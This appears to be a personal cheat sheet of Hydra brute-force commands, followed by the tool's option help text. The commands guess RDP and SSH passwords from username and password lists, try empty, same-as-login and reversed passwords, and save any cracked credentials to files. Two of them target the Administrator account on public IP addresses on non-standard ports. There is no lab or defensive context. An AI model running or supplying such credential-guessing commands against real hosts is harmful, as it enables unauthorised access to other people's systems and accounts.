hydra -l test005 -p 123456 -s 12345 -e nsr -v rdp://192.168.1.103
hydra -L username001.txt -P password001.txt.quchong -s 12345 -e nsr -v rdp://192.168.1.103
hydra -l Administrator -P /tmp/password11416.txt -t 2  -s 4389 -e nsr -v rdp://209.213.36.189
hydra -l Administrator -P password11416.txt   -s 33889 -e nsr -v -o save001.txt rdp://34.203.15.64



 hydra -L users.txt -P password.txt -t 1 -vV -e ns -o save.log 192.168.222.11 ssh
 hydra  -L users.txt -P password.txt -t 1 -vV -e ns -o save.log 192.168.222.11 ssh
 hydra  -L users.txt -P password.txt -t 1 -vV -e ns -o save.log 192.168.222.11 ssh



Options:                                                                                
  -R        restore a previous aborted/crashed session                                  
  -I        ignore an existing restore file (don't wait 10 seconds)                     
  -S        perform an SSL connect                                                      
  -s PORT   if the service is on a different default port, define it here               
  -l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE          
  -p PASS  or -P FILE  try password PASS, or load several passwords from FILE           
  -x MIN:MAX:CHARSET  password bruteforce generation, type "-x -h" to get help          
  -y        disable use of symbols in bruteforce, see above                             
  -r             rainy mode for password generation (-x)                                
  -e nsr    try "n" null password, "s" login as pass and/or "r" reversed login          
  -u        loop around users, not passwords (effective! implied with -x)               
  -C FILE   colon separated "login:pass" format, instead of -L/-P options               
  -M FILE   list of servers to attack, one entry per line, ':' to specify port          
  -o FILE   write found login/password pairs to FILE instead of stdout                  
  -b FORMAT specify the format for the -o FILE: text(default), json, jsonv1             
  -f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)           
  -t TASKS  run TASKS number of connects in parallel per target (default: 16)           
  -T TASKS  run TASKS connects in parallel overall (for -M, default: 64)                
  -w / -W TIME  wait time for a response (32) / between connects per thread (0)         
  -c TIME   wait time per login attempt over all threads (enforces -t 1)                
  -4 / -6   use IPv4 (default) / IPv6 addresses (put always in [] also in -M)           
  -v / -V / -d  verbose mode / show login+pass for each attempt / debug mode            
  -O        use old SSL v2 and v3                                                       
  -K        do not redo failed attempts (good for -M mass scanning)                     
  -q        do not print messages about connection errors                               
  -U        service module usage details                                                
  -m OPT    options specific for a module, see -U output for information                
  -h        more command line options (COMPLETE HELP)                                   
  server    the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)               
  service   the service to crack (see below for supported protocols)                    
  OPT       some service modules support additional input (-U for module help)          
